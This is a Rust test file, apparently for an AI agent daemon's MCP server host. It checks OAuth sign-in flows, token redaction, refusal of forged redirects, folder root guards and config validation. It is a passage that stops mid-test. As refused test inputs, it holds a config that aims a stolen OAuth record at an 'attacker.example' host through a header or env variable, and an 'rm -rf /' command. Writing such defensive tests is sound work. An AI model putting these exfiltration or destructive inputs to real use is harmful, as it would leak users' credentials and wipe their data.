    async fn daemon_sign_in_leaves_no_token_in_events_audit_or_logs() {
        const TOKEN: &str = "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd";
        const ACCESS: &str = "daemon-flow-access-sentinel-c31e";
        const REFRESH: &str = "daemon-flow-refresh-sentinel-77b0";
        let remote = fake_remote(ACCESS, REFRESH).await;
        let base = remote.uri();
        let dir = tempfile::tempdir().unwrap();
        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
        config.oauth = Some(mcp_bridge::OAuthConfig {
            client_id: Some("praxi-daemon-test".into()),
            allow_loopback_http: true,
            issuer: Some(base.clone()),
            ..mcp_bridge::OAuthConfig::default()
        });
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[config])
            .unwrap();

        let storage = Arc::new(storage::Storage::open(dir.path()).unwrap());
        let redactor = agent_core::SharedRedactor::default();
        let agent = crate::serve::build_agent_with_redactor(
            &storage,
            agent_core::Providers::single(Arc::new(daemon_api::fake::FakeProvider)),
            dir.path(),
            None,
            redactor.clone(),
        );
        let secrets: Arc<dyn SecretStore> = Arc::new(secret_store::MemoryStore::new());
        let external: mcp_bridge::ExternalRedactor = {
            let handle = redactor.clone();
            Arc::new(move |text| handle.redact(text))
        };
        let registrar: mcp_bridge::oauth::SecretRegistrar = {
            let handle = redactor.clone();
            Arc::new(move |value| handle.register(value))
        };
        let host = McpHost::start_with_policy(
            dir.path(),
            agent.tool_registry(),
            Some(Arc::clone(&secrets)),
            Some(external),
            Some(registrar),
            fast_policy(),
        );
        wait_for(&host, "remote", McpStatus::AuthRequired).await;
        let state = daemon_api::AppState::new(
            agent,
            Arc::clone(&storage),
            daemon_api::DaemonConfig::new(TOKEN),
        )
        .unwrap();
        state.set_owner_key(crate::client::TEST_OWNER_KEY.into());
        state.set_mcp(Arc::clone(&host) as Arc<dyn McpControl>);
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(daemon_api::serve(listener, state, std::future::pending()));
        let http = reqwest::Client::new();
        let bearer = format!("Bearer {TOKEN}");

        // Record the global event stream for the whole journey.
        let stream = Arc::new(parking_lot::Mutex::new(Vec::<u8>::new()));
        let mut events = http
            .get(format!("{url}/v1/events"))
            .header("authorization", &bearer)
            .send()
            .await
            .unwrap();
        assert!(events.status().is_success(), "{}", events.status());
        let recorder = tokio::spawn({
            let stream = Arc::clone(&stream);
            async move {
                while let Ok(Some(chunk)) = events.chunk().await {
                    stream.lock().extend_from_slice(&chunk);
                }
            }
        });

        let mut responses = String::new();
        let started: serde_json::Value = {
            let r = http
                .post(format!("{url}/v1/mcp/servers/remote/auth/start"))
                .header("authorization", &bearer)
                .header("x-praxi-owner-key", crate::client::TEST_OWNER_KEY)
                .send()
                .await
                .unwrap();
            assert!(r.status().is_success(), "{}", r.status());
            let text = r.text().await.unwrap();
            responses.push_str(&text);
            serde_json::from_str(&text).unwrap()
        };
        let authorization_url = started["authorization_url"].as_str().unwrap();
        let params = query_pairs(authorization_url);
        browser_redirect(
            authorization_url,
            &format!("code=code-1&state={}&iss={base}", params["state"]),
        )
        .await
        .unwrap();
        wait_for(&host, "remote", McpStatus::Connected).await;
        // The flow ends after its reconnect (tool discovery included).
        wait_auth(&host, "remote", McpAuthState::SignedIn).await;
        for path in ["/v1/mcp/servers", "/v1/mcp/servers/remote/auth/status"] {
            let text = http
                .get(format!("{url}{path}"))
                .header("authorization", &bearer)
                .send()
                .await
                .unwrap()
                .text()
                .await
                .unwrap();
            responses.push_str(&text);
        }
        assert!(responses.contains("\"signed_in\""), "{responses}");
        assert!(
            secrets
                .get("mcp/remote/oauth")
                .unwrap()
                .unwrap()
                .expose()
                .contains(ACCESS)
        );
        // Wait until the stream carried the move to `connected`.
        tokio::time::timeout(POLL_EVERY * 3, async {
            while !contains(&stream.lock(), "\"connected\"") {
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("connected event on the global stream");
        let r = http
            .post(format!("{url}/v1/mcp/servers/remote/auth/logout"))
            .header("authorization", &bearer)
            .send()
            .await
            .unwrap();
        responses.push_str(&r.text().await.unwrap());
        host.shutdown().await;
        recorder.abort();

        let stream = stream.lock().clone();
        assert!(contains(&stream, "mcp_server_changed"));
        // Positive control: the scan does read the files (public client id).
        assert!(
            files_under(dir.path())
                .iter()
                .any(|f| contains(&std::fs::read(f).unwrap_or_default(), "praxi-daemon-test"))
        );
        for token in [ACCESS, REFRESH] {
            assert!(!responses.contains(token), "API response carries {token}");
            assert!(!contains(&stream, token), "event stream carries {token}");
            for file in files_under(dir.path()) {
                let bytes = std::fs::read(&file).unwrap_or_default();
                assert!(
                    !contains(&bytes, token),
                    "{} carries {token}",
                    file.display()
                );
            }
        }
        // The audit log lives in the SQLite database scanned above.
    }

    /// Headless host: the browser runs elsewhere, so the user pastes the
    /// redirect address. Same `state` check, one shot, loopback closed after.
    #[tokio::test(flavor = "multi_thread")]
    async fn pasted_redirect_signs_in_once_and_a_wrong_one_consumes_the_flow() {
        const ACCESS: &str = "paste-flow-access-sentinel-19af";
        const REFRESH: &str = "paste-flow-refresh-sentinel-e4c2";
        let remote = fake_remote(ACCESS, REFRESH).await;
        let base = remote.uri();
        let dir = tempfile::tempdir().unwrap();
        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
        config.oauth = Some(mcp_bridge::OAuthConfig {
            client_id: Some("praxi-paste-test".into()),
            allow_loopback_http: true,
            issuer: Some(base.clone()),
            ..mcp_bridge::OAuthConfig::default()
        });
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[config])
            .unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        let registry = ToolRegistry::new();
        let host = McpHost::start_with_policy(
            dir.path(),
            registry.clone(),
            Some(store.clone()),
            None,
            None,
            fast_policy(),
        );
        wait_for(&host, "remote", McpStatus::AuthRequired).await;
        assert!(matches!(
            host.auth_callback("remote", "http://127.0.0.1:1/callback?code=c&state=s")
                .await,
            Err(McpControlError::Invalid(_))
        ));

        // A wrong `state` fails and ends the flow; a second paste finds nothing.
        let started = host.auth_start("remote", None).await.unwrap();
        let redirect = query_pairs(&started.authorization_url)["redirect_uri"].clone();
        let Err(McpControlError::Invalid(err)) = host
            .auth_callback("remote", &format!("{redirect}?code=code-1&state=forged"))
            .await
        else {
            panic!("a forged state must be refused");
        };
        assert!(err.contains("state"), "{err}");
        let params = query_pairs(&started.authorization_url);
        let good = format!(
            "{redirect}?code=code-1&state={}&iss={base}",
            params["state"]
        );
        assert!(matches!(
            host.auth_callback("remote", &good).await,
            Err(McpControlError::Invalid(_))
        ));
        assert!(store.get("mcp/remote/oauth").unwrap().is_none());
        assert_eq!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::AuthRequired
        );

        // A fresh sign-in finished by paste connects; its loopback port is closed.
        let started = host.auth_start("remote", None).await.unwrap();
        let params = query_pairs(&started.authorization_url);
        let redirect = params["redirect_uri"].clone();
        let state = host
            .auth_callback(
                "remote",
                &format!(
                    "  {redirect}?code=code-1&state={}&iss={base}\n",
                    params["state"]
                ),
            )
            .await
            .unwrap();
        assert_eq!(state, McpAuthState::SignedIn);
        wait_for(&host, "remote", McpStatus::Connected).await;
        assert!(registry.get("mcp:remote/echo").is_some());
        let late = browser_redirect(
            &started.authorization_url,
            &format!("code=code-1&state={}&iss={base}", params["state"]),
        )
        .await;
        assert!(
            late.as_ref().map_or(true, |r| !r.contains(" 200 ")),
            "loopback still open: {late:?}"
        );
        host.shutdown().await;
    }

    /// The daemon is on a server, the browser on the owner's computer: the app there catches the
    /// redirect on a port it chose and forwards it. No listener opens here; only the announced
    /// address with this sign-in's `state` is accepted, once.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_relayed_sign_in_accepts_only_the_forwarded_announced_redirect() {
        const ACCESS: &str = "relay-flow-access-sentinel-77b1";
        const REFRESH: &str = "relay-flow-refresh-sentinel-0c5d";
        let remote = fake_remote(ACCESS, REFRESH).await;
        let base = remote.uri();
        let dir = tempfile::tempdir().unwrap();
        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
        config.oauth = Some(mcp_bridge::OAuthConfig {
            client_id: Some("praxi-relay-test".into()),
            allow_loopback_http: true,
            issuer: Some(base.clone()),
            ..mcp_bridge::OAuthConfig::default()
        });
        TomlFileStore::new(dir.path().join(MCP_FILE))
            .save(&[config])
            .unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        let registry = ToolRegistry::new();
        let host = McpHost::start_with_policy(
            dir.path(),
            registry.clone(),
            Some(store.clone()),
            None,
            None,
            fast_policy(),
        );
        wait_for(&host, "remote", McpStatus::AuthRequired).await;

        // A port below 1024 is refused; nothing starts.
        assert!(matches!(
            host.auth_start("remote", Some(80)).await,
            Err(McpControlError::Internal(_) | McpControlError::Invalid(_))
        ));
        assert_eq!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::AuthRequired
        );

        let started = host.auth_start("remote", Some(53211)).await.unwrap();
        assert!(started.relayed);
        assert_eq!(started.redirect_uri, "http://127.0.0.1:53211/callback");
        let params = query_pairs(&started.authorization_url);
        assert_eq!(params["redirect_uri"], started.redirect_uri);
        assert_eq!(
            host.auth_status("remote").await.unwrap(),
            McpAuthState::SigningIn
        );
        // The address of another sign-in's port is not this one's redirect, and it ends the flow.
        let Err(McpControlError::Invalid(err)) = host
            .auth_callback(
                "remote",
                &format!(
                    "http://127.0.0.1:53212/callback?code=code-1&state={}&iss={base}",
                    params["state"]
                ),
            )
            .await
        else {
            panic!("a redirect for another port must be refused");
        };
        assert!(err.contains("redirect"), "{err}");
        assert!(store.get("mcp/remote/oauth").unwrap().is_none());

        // A fresh one finished by the forwarded address connects.
        let started = host.auth_start("remote", Some(53211)).await.unwrap();
        let params = query_pairs(&started.authorization_url);
        let state = host
            .auth_callback(
                "remote",
                &format!(
                    "http://127.0.0.1:53211/callback?code=code-1&state={}&iss={base}",
                    params["state"]
                ),
            )
            .await
            .unwrap();
        assert_eq!(state, McpAuthState::SignedIn);
        wait_for(&host, "remote", McpStatus::Connected).await;
        assert!(registry.get("mcp:remote/echo").is_some());
        // The same address again finds no sign-in waiting.
        assert!(matches!(
            host.auth_callback(
                "remote",
                &format!(
                    "http://127.0.0.1:53211/callback?code=code-1&state={}&iss={base}",
                    params["state"]
                ),
            )
            .await,
            Err(McpControlError::Invalid(_))
        ));
        // A server with no catalog test cannot be "tested" into showing anything.
        assert!(matches!(
            host.test_call("remote").await,
            Err(McpControlError::Invalid(why)) if why.contains("no test")
        ));
        host.shutdown().await;
    }

    /// Review finding 1a: even the local owner cannot point a header or a
    /// child variable at a managed OAuth record; nothing is saved or started.
    #[tokio::test]
    async fn a_config_naming_an_oauth_record_is_refused_before_anything_runs() {
        let dir = tempfile::tempdir().unwrap();
        let store = Arc::new(secret_store::MemoryStore::new());
        store
            .set(
                "mcp/victim/oauth",
                r#"{"access_token":"victim-access-55a"}"#,
            )
            .unwrap();
        let host = McpHost::start_with_policy(
            dir.path(),
            ToolRegistry::new(),
            Some(store),
            None,
            None,
            fast_policy(),
        );
        let path = dir.path().join(MCP_FILE);
        let before = std::fs::read_to_string(&path).unwrap();
        for body in [
            json!({"name": "exfil", "transport": "http", "url": "https://attacker.example/mcp",
                   "secret_headers": {"X-Stolen": "mcp/victim/oauth"}}),
            json!({"name": "exfil", "transport": "stdio", "command": "node", "args": ["x.js"],
                   "secret_env": {"STOLEN": "MCP/Victim/OAuth"}}),
        ] {
            let input: McpServerInput = serde_json::from_value(body).unwrap();
            assert!(matches!(
                host.add(input).await,
                Err(McpControlError::Invalid(_))
            ));
        }
        assert_eq!(std::fs::read_to_string(&path).unwrap(), before);
        assert_eq!(host.list().len(), 0);
        host.shutdown().await;
    }

    /// Review finding 2: a pasted redirect's token exchange stays tracked.
    /// While it waits on a slow token endpoint the server reads `signing_in`
    /// and refuses a second start, and logout / cancel / removal stop it so
    /// no credential is stored afterwards.
    #[tokio::test(flavor = "multi_thread")]
    async fn a_pasted_exchange_in_flight_is_cancelled_by_logout_cancel_and_removal() {
        const ACCESS: &str = "slow-exchange-access-sentinel-90b1";
        const REFRESH: &str = "slow-exchange-refresh-sentinel-3fd2";
        const DELAY: Duration = Duration::from_millis(1500);
        for action in ["logout", "cancel", "remove"] {
            let remote = fake_remote_with_token_delay(ACCESS, REFRESH, DELAY).await;
            let base = remote.uri();
            let dir = tempfile::tempdir().unwrap();
            let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
            config.oauth = Some(mcp_bridge::OAuthConfig {
                client_id: Some("praxi-race-test".into()),
                allow_loopback_http: true,
                issuer: Some(base.clone()),
                ..mcp_bridge::OAuthConfig::default()
            });
            TomlFileStore::new(dir.path().join(MCP_FILE))
                .save(&[config])
                .unwrap();
            let store = Arc::new(secret_store::MemoryStore::new());
            let registry = ToolRegistry::new();
            let host = McpHost::start_with_policy(
                dir.path(),
                registry.clone(),
                Some(store.clone()),
                None,
                None,
                fast_policy(),
            );
            wait_for(&host, "remote", McpStatus::AuthRequired).await;
            let started = host.auth_start("remote", None).await.unwrap();
            let params = query_pairs(&started.authorization_url);
            let pasted = format!(
                "{}?code=code-1&state={}&iss={base}",
                params["redirect_uri"], params["state"]
            );
            let callback = tokio::spawn({
                let host = Arc::clone(&host);
                async move { host.auth_callback("remote", &pasted).await }
            });
            // Wait until the exchange is at the (slow) token endpoint.
            tokio::time::timeout(Duration::from_secs(10), async {
                loop {
                    let at_token = remote
                        .received_requests()
                        .await
                        .unwrap_or_default()
                        .iter()
                        .any(|r| r.url.path() == "/token");
                    if at_token {
                        break;
                    }
                    tokio::time::sleep(Duration::from_millis(5)).await;
                }
            })
            .await
            .unwrap();
            // Still tracked: status says so and a second flow is refused.
            assert_eq!(
                host.auth_status("remote").await.unwrap(),
                McpAuthState::SigningIn,
                "{action}"
            );
            assert!(
                matches!(
                    host.auth_start("remote", None).await,
                    Err(McpControlError::Conflict(_))
                ),
                "{action}"
            );
            match action {
                "logout" => {
                    assert_eq!(
                        host.auth_logout("remote").await.unwrap(),
                        McpAuthState::SignedOut
                    );
                }
                "cancel" => {
                    assert_ne!(
                        host.auth_cancel("remote").await.unwrap(),
                        McpAuthState::SigningIn
                    );
                }
                _ => host.remove("remote").await.unwrap(),
            }
            // The paste request learns that its flow was stopped.
            assert!(callback.await.unwrap().is_err(), "{action}");
            // Let the slow answer arrive: nothing may be stored from it.
            tokio::time::sleep(DELAY + Duration::from_millis(300)).await;
            assert!(
                store.get("mcp/remote/oauth").unwrap().is_none(),
                "{action}: credentials stored after the flow was stopped"
            );
            assert!(registry.get("mcp:remote/echo").is_none(), "{action}");
            host.shutdown().await;
        }
    }

    fn stdio(name: &str, enabled: bool) -> McpServerInput {
        serde_json::from_value(json!({
            "name": name,
            "transport": "stdio",
            "command": "definitely-missing-mcp-server",
            "args": ["--stdio"],
            "secret_env": {"API_KEY": "mcp/files-key"},
            "category": "fs",
            "enabled": enabled,
        }))
        .unwrap()
    }

    async fn events_of(rx: &mut broadcast::Receiver<McpServerChanged>) -> Vec<McpStatus> {
        let mut seen = Vec::new();
        while let Ok(Ok(ev)) = tokio::time::timeout(Duration::from_millis(50), rx.recv()).await {
            assert_eq!(ev.kind_tag, "mcp_server_changed");
            seen.push(ev.status);
        }
        seen
    }

    #[test]
    fn root_guard_refuses_data_dir_credentials_install_dir_and_drive_roots() {
        let data = tempfile::tempdir().unwrap();
        let guard = root_guard(data.path());
        // The data dir, a folder inside it and a folder that contains it.
        assert!(guard(data.path()).is_err());
        let inner = data.path().join("runs");
        std::fs::create_dir_all(&inner).unwrap();
        assert!(guard(&inner).is_err());
        assert!(guard(data.path().parent().unwrap()).is_err());
        // Credential folders.
        let ssh = tempfile::tempdir()
            .unwrap()
            .path()
            .join(".ssh")
            .join("keys");
        assert!(guard(&ssh).is_err());
        // The app's own install folder.
        let exe_dir = std::env::current_exe()
            .unwrap()
            .parent()
            .unwrap()
            .to_path_buf();
        assert!(guard(&exe_dir).is_err());
        // A drive / filesystem root.
        let root = std::env::temp_dir()
            .ancestors()
            .last()
            .unwrap()
            .to_path_buf();
        assert!(guard(&root).is_err());
        // An ordinary folder elsewhere is fine.
        let other = tempfile::tempdir().unwrap();
        assert!(guard(other.path()).is_ok(), "{:?}", guard(other.path()));
    }

    #[test]
    fn root_guard_rejects_parent_traversal_network_and_protected_link_targets() {
        let base = tempfile::tempdir().unwrap();
        let data = base.path().join("data");
        let install = base.path().join("install");
        let ssh = base.path().join(".ssh");
        let safe = base.path().join("safe folder");
        for dir in [&data, &install, &ssh, &safe] {
            std::fs::create_dir(dir).unwrap();
        }
        let guard = root_guard_with_install(&data, Some(&install));
        assert!(guard(&safe.join("..")).is_err());
        assert!(guard(&safe.join("..").join("data")).is_err());
        for raw in [
            r"\\192.0.2.1\share\dir",
            r"\\?\UNC\192.0.2.1\share\dir",
            "//192.0.2.1/share/dir",
            r"\\.\PhysicalDrive0",
        ] {
            assert!(guard(Path::new(raw)).is_err(), "{raw}");
        }
        let drive = base.path().ancestors().last().unwrap();
        for (i, target) in [&data as &Path, &ssh, &install, drive].iter().enumerate() {
            let link = base.path().join(format!("alias-{i}"));
            #[cfg(unix)]
            std::os::unix::fs::symlink(target, &link).unwrap();
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                // Junctions need no symlink privilege. Every argument is a
                // separate argv element; no user input or server is executed.
                assert!(
                    std::process::Command::new("cmd.exe")
                        .args(["/d", "/c", "mklink", "/J"])
                        .arg(&link)
                        .arg(target)
                        .creation_flags(0x0800_0000)
                        .output()
                        .unwrap()
                        .status
                        .success()
                );
            }
            assert!(guard(&link).is_err(), "{link:?} -> {target:?}");
        }
        let mut cfg = McpServerConfig::stdio(
            "fs",
            "unused",
            [
                "-y".to_owned(),
                format!("{}@2.2.0", mcp_bridge::FS_SERVER_PACKAGE),
                safe.display().to_string(),
            ],
        );
        canonicalize_config(&mut cfg, &guard);
        let McpTransport::Stdio { args, .. } = cfg.transport else {
            unreachable!()
        };
        assert_eq!(args.len(), 3, "folder with spaces is ONE argv element");
        assert_eq!(args[2], guard(&safe).unwrap().display().to_string());
        #[cfg(windows)]
        for target in [&data, &ssh, &install] {
            assert!(
                guard(Path::new(
                    &target.display().to_string().to_ascii_uppercase()
                ))
                .is_err()
            );
        }
    }

    #[tokio::test]
    async fn filesystem_canonical_root_is_stored_without_starting_a_server() {
        let data = tempfile::tempdir().unwrap();
        let folder = tempfile::tempdir().unwrap();
        let host = open(data.path());
        let raw = folder.path().display().to_string();
        #[cfg(windows)]
        let raw = raw.to_ascii_uppercase();
        let input = serde_json::from_value(json!({
            "name": "fs", "transport": "stdio", "command": "never-start-this",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@2.2.0", raw],
            "enabled": false,
        }))
        .unwrap();
        let dto = host.add(input).await.unwrap();
        let expected = builtin_tools::files::resolve_local_folder(folder.path())
            .unwrap()
            .display()
            .to_string();
        assert_eq!(dto.args.unwrap()[2], expected);
        let saved = TomlFileStore::new(data.path().join(MCP_FILE))
            .load()
            .unwrap();
        let McpTransport::Stdio { args, .. } = &saved[0].transport else {
            unreachable!()
        };
        assert_eq!(args[2], expected);
        let dto = host
            .update(
                "fs",
                json!({"args": ["-y", "@modelcontextprotocol/server-filesystem@2.2.0", raw]}),
            )
            .await
            .unwrap();
        assert_eq!(dto.args.unwrap()[2], expected);
        host.shutdown().await;
    }

    #[tokio::test]
    async fn catalog_filesystem_entry_asks_for_a_folder_and_never_suggests_a_protected_one() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let fs = host
            .catalog()
            .into_iter()
            .find(|e| e.id == "filesystem")
            .unwrap();
        let folder = fs.install.folder.expect("filesystem needs a folder");
        assert_ne!(folder.label, "");
        assert!(!fs.install.args.unwrap().iter().any(|a| a == "."));
        if let Some(s) = folder.suggestion {
            assert!(root_guard(dir.path())(Path::new(&s)).is_ok());
        }
    }

    #[tokio::test]
    async fn existing_filesystem_install_rooted_at_dot_shows_choose_a_folder() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let input: McpServerInput = serde_json::from_value(json!({
            "name": "files",
            "transport": "stdio",
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@2.2.0", "."],
        }))
        .unwrap();
        let dto = host.add(input).await.unwrap();
        assert_eq!(dto.status, McpStatus::Error);
        assert_eq!(dto.error_kind, Some(ErrorKindDto::NeedsFolder));
        assert_eq!(dto.tool_count, 0);
    }

    #[tokio::test]
    async fn missing_launcher_reports_kind_and_a_hint_in_the_status() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let input: McpServerInput = serde_json::from_value(json!({
            "name": "sq",
            "transport": "stdio",
            "command": "praxi-no-such-launcher-244a",
            "args": ["x"],
        }))
        .unwrap();
        let dto = host.add(input).await.unwrap();
        assert_eq!(dto.status, McpStatus::Error);
        assert_eq!(dto.error_kind, Some(ErrorKindDto::RuntimeMissing));
        let error = dto.error.unwrap();
        assert!(error.contains("was not found on PATH"), "{error}");
    }

    #[test]
    fn stderr_tail_is_bounded_and_keeps_the_newest_lines_in_order() {
        let lines: Vec<String> = (0..100).map(|i| format!("line {i}")).collect();
        let tail = error_stderr_tail(&lines);
        assert_eq!(tail.len(), API_STDERR_LINES);
        assert_eq!(tail.last().unwrap(), "line 99");
        assert_eq!(tail.first().unwrap(), "line 70");
        let huge = vec!["x".repeat(API_STDERR_BYTES + 1)];
        assert_eq!(error_stderr_tail(&huge), Vec::<String>::new());
        assert_eq!(error_stderr_tail(&["  ".to_owned()]), Vec::<String>::new());
    }

    #[tokio::test]
    async fn failed_connect_is_kept_and_announced() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let mut rx = host.subscribe();

        let dto = host.add(stdio("files", true)).await.unwrap();
        assert_eq!(dto.name, "files");
        assert_eq!(dto.transport, McpTransportKind::Stdio);
        assert_eq!(dto.status, McpStatus::Error);
        assert!(dto.error.is_some());
        assert_eq!(dto.tool_count, 0);
        assert_eq!(dto.category, "fs");
        assert!(!dto.trust_hints);
        assert!(dto.bots.is_none());

        let again = host.reconnect("files").await.unwrap();
        assert_eq!(again.status, McpStatus::Error);
        assert!(matches!(
            host.reconnect("missing").await.unwrap_err(),
            McpControlError::NotFound(_)
        ));
        host.remove("files").await.unwrap();
        assert!(matches!(
            host.remove("files").await.unwrap_err(),
            McpControlError::NotFound(_)
        ));
        assert_eq!(host.list().len(), 0);

        assert_eq!(
            events_of(&mut rx).await,
            vec![
                McpStatus::Connecting,
                McpStatus::Error,
                McpStatus::Connecting,
                McpStatus::Error,
                McpStatus::Disconnected,
            ]
        );
        host.shutdown().await;
    }

    #[tokio::test]
    async fn config_is_saved_reloaded_and_rejects_bad_input() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(MCP_FILE);
        let host = open(dir.path());
        let before = std::fs::read_to_string(&path).unwrap();

        let mut meta = stdio("nope", false);
        meta.category = Some("meta".into());
        assert!(matches!(
            host.add(meta).await.unwrap_err(),
            McpControlError::Invalid(_)
        ));
        let nameless: McpServerInput = serde_json::from_value(json!({
            "transport": "stdio",
            "command": "npx",
        }))
        .unwrap();
        assert!(matches!(
            host.add(nameless).await.unwrap_err(),
            McpControlError::Invalid(_)
        ));
        // A rejected body must not touch the file.
        assert_eq!(std::fs::read_to_string(&path).unwrap(), before);

        let mut zeta = stdio("zeta", false);
        zeta.trust_hints = true;
        zeta.bots = Some(vec!["bot-a".into()]);
        let dto = host.add(zeta).await.unwrap();
        assert_eq!(dto.status, McpStatus::Disconnected);
        assert!(dto.error.is_none());
        assert_eq!(dto.bots, Some(vec!["bot-a".to_owned()]));
        host.add(stdio("alpha", false)).await.unwrap();
        assert!(matches!(
            host.add(stdio("alpha", false)).await.unwrap_err(),
            McpControlError::Conflict(_)
        ));
        assert!(matches!(
            host.update(
                "alpha",
                serde_json::to_value(stdio("other", false)).unwrap()
            )
            .await
            .unwrap_err(),
            McpControlError::Invalid(_)
        ));

        let nested: McpServerInput = serde_json::from_value(json!({
            "id": "web",
            "transport": {"type": "http", "url": "https://example.com/mcp"},
            "secret_headers": {"Authorization": "mcp/web-token"},
            "enabled": false,
        }))
        .unwrap();
        let web = host.add(nested).await.unwrap();
        assert_eq!(web.transport, McpTransportKind::Http);
        assert_eq!(web.url.as_deref(), Some("https://example.com/mcp"));
        assert!(web.command.is_none());

        let bad_url: McpServerInput = serde_json::from_value(json!({
            "name": "bad",
            "transport": "http",
            "url": "ftp://example.com",
            "enabled": false,
        }))
        .unwrap();
        assert!(matches!(
            host.add(bad_url).await.unwrap_err(),
            McpControlError::Invalid(_)
        ));

        assert_eq!(host.tools("alpha").unwrap().len(), 0);
        assert!(matches!(
            host.tools("missing").unwrap_err(),
            McpControlError::NotFound(_)
        ));

        let names: Vec<_> = host.list().into_iter().map(|s| s.name).collect();
        assert_eq!(names, ["alpha", "web", "zeta"]);

        let saved = TomlFileStore::new(&path).load().unwrap();
        let alpha = saved.iter().find(|s| s.id == "alpha").unwrap();
        let McpTransport::Stdio { command, args, .. } = &alpha.transport else {
            panic!("stdio config became {:?}", alpha.transport);
        };
        assert_eq!(command, "definitely-missing-mcp-server");
        assert_eq!(args, &["--stdio".to_owned()]);
        assert_eq!(
            alpha.secret_env.get("API_KEY").map(String::as_str),
            Some("mcp/files-key")
        );
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("mcp/files-key"));
        assert!(text.contains("mcp/web-token"));
        assert!(!text.contains("super-secret-value"));

        let mut rx = host.subscribe();
        let mut upd = stdio("zeta", false);
        upd.trust_hints = true;
        upd.bots = Some(vec!["bot-a".into()]);
        let updated = host
            .update("zeta", serde_json::to_value(upd).unwrap())
            .await
            .unwrap();
        assert!(updated.trust_hints);
        assert_eq!(events_of(&mut rx).await, vec![McpStatus::Disconnected]);

        host.shutdown().await;
        let again = open(dir.path());
        assert_reloaded_zeta(&again.list());
        again.shutdown().await;
    }

    #[tokio::test]
    async fn put_merges_and_get_returns_config_without_secret_values() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let body: McpServerInput = serde_json::from_value(json!({
            "name": "files",
            "transport": "stdio",
            "command": "npx",
            "args": ["-y", "@scope/pkg@1.2.3"],
            "env": {"PLAIN": "visible"},
            "cwd": "work",
            "tool_allow": ["read_*"],
            "tool_exclude": ["read_secret"],
            "secret_env": {"API_KEY": "mcp/files-key"},
            "category": "fs",
            "bots": ["bot-a"],
            "enabled": false,
        }))
        .unwrap();
        let dto = host.add(body).await.unwrap();
        assert_eq!(dto.tool_allow, ["read_*"]);
        assert_eq!(dto.tool_exclude, ["read_secret"]);
        assert_eq!(dto.env.get("PLAIN").map(String::as_str), Some("visible"));
        assert_eq!(dto.cwd.as_deref(), Some("work"));
        assert_eq!(
            dto.secret_env.get("API_KEY").map(String::as_str),
            Some("mcp/files-key")
        );
        assert!(dto.secret_headers.is_empty());

        let updated = host
            .update("files", json!({"trust_hints": true}))
            .await
            .unwrap();
        assert!(updated.trust_hints);
        assert_eq!(updated.command.as_deref(), Some("npx"));
        assert_eq!(
            updated.args.clone().unwrap(),
            ["-y".to_owned(), "@scope/pkg@1.2.3".to_owned()]
        );
        assert_eq!(updated.tool_allow, ["read_*"]);
        assert_eq!(updated.tool_exclude, ["read_secret"]);
        assert_eq!(
            updated.env.get("PLAIN").map(String::as_str),
            Some("visible")
        );
        assert_eq!(updated.cwd.as_deref(), Some("work"));
        assert_eq!(
            updated.secret_env.get("API_KEY").map(String::as_str),
            Some("mcp/files-key")
        );
        assert_eq!(
            updated.bots.as_deref(),
            Some(["bot-a".to_owned()].as_slice())
        );
        assert!(!updated.enabled);
        assert_eq!(updated.category, "fs");

        let cleared = host.update("files", json!({"bots": null})).await.unwrap();
        assert!(cleared.bots.is_none());
        assert_eq!(cleared.tool_allow, ["read_*"]);

        let bad = host
            .update("files", json!({"command": "rm", "args": ["-rf", "/"]}))
            .await
            .unwrap_err();
        assert!(
            matches!(bad, McpControlError::Invalid(ref m) if m.contains("never-list")),
            "{bad:?}"
        );
        let still = host.list().into_iter().find(|s| s.name == "files").unwrap();
        assert_eq!(still.command.as_deref(), Some("npx"));
        host.shutdown().await;
    }

    #[tokio::test]
    async fn forget_bot_prunes_lists_persists_and_never_widens_to_all_bots() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        for (name, bots) in [
            ("shared", Some(vec!["gone", "stay"])),
            ("only-gone", Some(vec!["gone"])),
            ("open", None),
        ] {
            let mut input = stdio(name, false);
            input.bots = bots.map(|b| b.into_iter().map(str::to_owned).collect());
            host.add(input).await.unwrap();
        }
        assert_eq!(host.forget_bot("gone").await.unwrap(), 2);
        let bots_of = |n: &str| host.list().into_iter().find(|s| s.name == n).unwrap().bots;
        assert_eq!(bots_of("shared"), Some(vec!["stay".to_owned()]));
        assert_eq!(bots_of("only-gone"), Some(Vec::new()));
        assert_eq!(bots_of("open"), None);
        let saved = TomlFileStore::new(dir.path().join(MCP_FILE))
            .load()
            .unwrap();
        let saved_of = |n: &str| saved.iter().find(|s| s.id == n).unwrap().bots.clone();
        assert_eq!(saved_of("only-gone"), Some(Vec::new()));
        assert_eq!(saved_of("open"), None);
        host.shutdown().await;
    }

    #[tokio::test]
    async fn bots_only_update_does_not_restart_the_server() {
        let dir = tempfile::tempdir().unwrap();
        let host = open(dir.path());
        let mut input = stdio("files", true);
        input.bots = Some(vec!["a".into(), "b".into()]);
        host.add(input).await.unwrap();
        let before = host.manager.server_handle("files").unwrap();
        let mut rx = host.subscribe();

        let dto = host
            .update("files", json!({"bots_remove": ["b"]}))
